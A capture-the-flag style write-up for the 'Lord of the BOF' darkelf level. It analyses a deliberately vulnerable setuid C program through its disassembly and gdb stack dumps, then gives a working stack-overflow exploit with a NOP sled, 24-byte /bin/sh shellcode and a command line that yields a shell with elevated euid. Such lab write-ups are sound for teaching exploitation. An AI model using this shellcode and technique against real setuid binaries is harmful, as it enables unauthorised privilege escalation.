# Level 5, Wolfman -> Darkelf

### darkelf.c

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - darkelf
        - egghunter + buffer hunter + check length of argv[1]
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
                printf("argument is too long!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}
```

### Analysis

#### Disassembling the "darkelf"

```
0x8048500 <main>:       push   %ebp
0x8048501 <main+1>:     mov    %ebp,%esp
0x8048503 <main+3>:     sub    %esp,44
0x8048506 <main+6>:     cmp    DWORD PTR [%ebp+8],1
0x804850a <main+10>:    jg     0x8048523 <main+35>
0x804850c <main+12>:    push   0x8048670
0x8048511 <main+17>:    call   0x8048410 <printf>
0x8048516 <main+22>:    add    %esp,4
0x8048519 <main+25>:    push   0
0x804851b <main+27>:    call   0x8048420 <exit>
0x8048520 <main+32>:    add    %esp,4
0x8048523 <main+35>:    nop
0x8048524 <main+36>:    mov    DWORD PTR [%ebp-44],0x0
0x804852b <main+43>:    nop
0x804852c <main+44>:    lea    %esi,[%esi*1]
0x8048530 <main+48>:    mov    %eax,DWORD PTR [%ebp-44]
0x8048533 <main+51>:    lea    %edx,[%eax*4]
0x804853a <main+58>:    mov    %eax,%ds:0x80497a4
0x804853f <main+63>:    cmp    DWORD PTR [%eax+%edx],0
0x8048543 <main+67>:    jne    0x8048547 <main+71>
0x8048545 <main+69>:    jmp    0x8048587 <main+135>
0x8048547 <main+71>:    mov    %eax,DWORD PTR [%ebp-44]
0x804854a <main+74>:    lea    %edx,[%eax*4]
0x8048551 <main+81>:    mov    %eax,%ds:0x80497a4
0x8048556 <main+86>:    mov    %edx,DWORD PTR [%eax+%edx]
0x8048559 <main+89>:    push   %edx
0x804855a <main+90>:    call   0x80483f0 <strlen>
0x804855f <main+95>:    add    %esp,4
0x8048562 <main+98>:    mov    %eax,%eax
0x8048564 <main+100>:   push   %eax
0x8048565 <main+101>:   push   0
0x8048567 <main+103>:   mov    %eax,DWORD PTR [%ebp-44]
0x804856a <main+106>:   lea    %edx,[%eax*4]
0x8048571 <main+113>:   mov    %eax,%ds:0x80497a4
0x8048576 <main+118>:   mov    %edx,DWORD PTR [%eax+%edx]
0x8048579 <main+121>:   push   %edx
0x804857a <main+122>:   call   0x8048430 <memset>
0x804857f <main+127>:   add    %esp,12
0x8048582 <main+130>:   inc    DWORD PTR [%ebp-44]
0x8048585 <main+133>:   jmp    0x8048530 <main+48>
0x8048587 <main+135>:   mov    %eax,DWORD PTR [%ebp+12]
0x804858a <main+138>:   add    %eax,4
0x804858d <main+141>:   mov    %edx,DWORD PTR [%eax]
0x804858f <main+143>:   add    %edx,47
0x8048592 <main+146>:   cmp    BYTE PTR [%edx],0xbf
0x8048595 <main+149>:   je     0x80485b0 <main+176>
0x8048597 <main+151>:   push   0x804867c
0x804859c <main+156>:   call   0x8048410 <printf>
0x80485a1 <main+161>:   add    %esp,4
0x80485a4 <main+164>:   push   0
0x80485a6 <main+166>:   call   0x8048420 <exit>
0x80485ab <main+171>:   add    %esp,4
0x80485ae <main+174>:   mov    %esi,%esi
0x80485b0 <main+176>:   mov    %eax,DWORD PTR [%ebp+12]
0x80485b3 <main+179>:   add    %eax,4
0x80485b6 <main+182>:   mov    %edx,DWORD PTR [%eax]
0x80485b8 <main+184>:   push   %edx
0x80485b9 <main+185>:   call   0x80483f0 <strlen>
0x80485be <main+190>:   add    %esp,4
0x80485c1 <main+193>:   mov    %eax,%eax
0x80485c3 <main+195>:   cmp    %eax,48
0x80485c6 <main+198>:   jbe    0x80485e0 <main+224>
0x80485c8 <main+200>:   push   0x8048699
0x80485cd <main+205>:   call   0x8048410 <printf>
0x80485d2 <main+210>:   add    %esp,4
0x80485d5 <main+213>:   push   0
0x80485d7 <main+215>:   call   0x8048420 <exit>
0x80485dc <main+220>:   add    %esp,4
0x80485df <main+223>:   nop
0x80485e0 <main+224>:   mov    %eax,DWORD PTR [%ebp+12]
0x80485e3 <main+227>:   add    %eax,4
0x80485e6 <main+230>:   mov    %edx,DWORD PTR [%eax]
0x80485e8 <main+232>:   push   %edx
0x80485e9 <main+233>:   lea    %eax,[%ebp-40]
0x80485ec <main+236>:   push   %eax
0x80485ed <main+237>:   call   0x8048440 <strcpy>
0x80485f2 <main+242>:   add    %esp,8
0x80485f5 <main+245>:   lea    %eax,[%ebp-40]
0x80485f8 <main+248>:   push   %eax
0x80485f9 <main+249>:   push   0x80486b0
0x80485fe <main+254>:   call   0x8048410 <printf>
0x8048603 <main+259>:   add    %esp,8
0x8048606 <main+262>:   push   40
0x8048608 <main+264>:   push   0
0x804860a <main+266>:   lea    %eax,[%ebp-40]
0x804860d <main+269>:   push   %eax
0x804860e <main+270>:   call   0x8048430 <memset>
0x8048613 <main+275>:   add    %esp,12
0x8048616 <main+278>:   leave
0x8048617 <main+279>:   ret
```

#### Estimated Stack Structure

```
|  int i (4 bytes)            |         [%ebp-44]
|  BUFFER (40 bytes)          |         [%ebp-40]
|  SFP (4 bytes)              |         [%ebp]
|  RET (4 bytes)              |         [%ebp+4]             --|
|  ARGC (4 bytes)             |         [%ebp+8]               |
|  ARGV[0] (?? bytes)         |         DWORD PTR [%ebp+12]    |
|  ARGV[1] (?? bytes)         |         DWORD PTR [%ebp+16]    ↓
```

#### Observed Stack Structure (bp at *main+278)

```
(gdb) b *main+278
Breakpoint 1 at 0x8048616
(gdb) run `python -c "print 'A'*44+'\xbf'*4"` `python -c "print '\x90'*200"`
Starting program: /home/wolfman/darkelf-co `python -c "print 'A'*44+'\xbf'*4"` `python -c "print '\x90'*200"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒▒▒

Breakpoint 1, 0x8048616 in main ()
(gdb) x/200x $esp
0xbffff9ec:     0x00000015      0x00000000      0x00000000      0x00000000  -> int i, The 'buffer[40]', memset-ted to 0
0xbffff9fc:     0x00000000      0x00000000      0x00000000      0x00000000  -> The 'buffer[40]'
0xbffffa0c:     0x00000000      0x00000000      0x00000000      0x41414141  -> The 'buffer[40]', Overwritten SFP
0xbffffa1c:     0xbfbfbfbf      0x00000000      0xbffffa64      0xbffffa74  -> Overwritten RET, ARGC, ARGV[0] Pointer, ARGV[1] Pointer
0xbffffa2c:     0x40013868      0x00000003      0x08048450      0x00000000
0xbffffa3c:     0x08048471      0x08048500      0x00000003      0xbffffa64
0xbffffa4c:     0x08048390      0x0804864c      0x4000ae60      0xbffffa5c
0xbffffa5c:     0x40013e90      0x00000003      0xbffffb58      0xbffffb71
0xbffffa6c:     0xbffffba2      0x00000000      0xbffffc6b      0xbffffc7d
0xbffffa7c:     0xbffffc96      0xbffffcb5      0xbffffcd7      0xbffffce4
0xbffffa8c:     0xbffffea7      0xbffffec6      0xbffffee3      0xbffffef8
0xbffffa9c:     0xbfffff17      0xbfffff22      0xbfffff32      0xbfffff3a
0xbffffaac:     0xbfffff4b      0xbfffff55      0xbfffff63      0xbfffff74
0xbffffabc:     0xbfffff82      0xbfffff8d      0xbfffffa0      0x00000000
0xbffffacc:     0x00000003      0x08048034      0x00000004      0x00000020
0xbffffadc:     0x00000005      0x00000006      0x00000006      0x00001000
0xbffffaec:     0x00000007      0x40000000      0x00000008      0x00000000
0xbffffafc:     0x00000009      0x08048450      0x0000000b      0x000001f9
0xbffffb0c:     0x0000000c      0x000001f9      0x0000000d      0x000001f9
0xbffffb1c:     0x0000000e      0x000001f9      0x00000010      0x0fabfbff
0xbffffb2c:     0x0000000f      0xbffffb53      0x00000000      0x00000000
0xbffffb3c:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffb4c:     0x00000000      0x69000000      0x00363836      0x6d6f682f
0xbffffb5c:     0x6f772f65      0x616d666c      0x61642f6e      0x6c656b72
0xbffffb6c:     0x6f632d66      0x41414100      0x41414141      0x41414141  -> ARGV[0]
0xbffffb7c:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffb8c:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffb9c:     0xbfbfbf41      0x909000bf      0x90909090      0x90909090  -> ARGV[0], ARGV[1]
0xbffffbac:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffbbc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffbcc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffbdc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffbec:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffbfc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc0c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc1c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc2c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc3c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc4c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc5c:     0x90909090      0x90909090      0x90909090      0x00009090
0xbffffc6c:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc7c:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc8c:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc9c:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffcac:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffcbc:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffccc:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffcdc:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffcec:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffcfc:     0x00000000      0x00000000      0x00000000      0x00000000
```

### Exploit

#### Payload Structure

```
ARGV[1]
'A'*44
+
'\xac\xfb\xff\xbf'

ARGV[2]
'\x90'*200
+
'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

```

#### Shellcode (24 bytes)

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

#### Final Payload

```
./darkelf `python -c "print 'A'*44+'\xac\xfb\xff\xbf'"` `python -c "print '\x90'*200+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
```

### Result

```
[wolfman@localhost wolfman]$ ./darkelf `python -c "print 'A'*44+'\xac\xfb\xff\xbf'"` `python -c "print '\x90'*200+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒▒▒
bash$ id
uid=505(wolfman) gid=505(wolfman) euid=506(darkelf) egid=506(darkelf) groups=505(wolfman)
bash$ my-pass
euid = 506
kernel crashed
```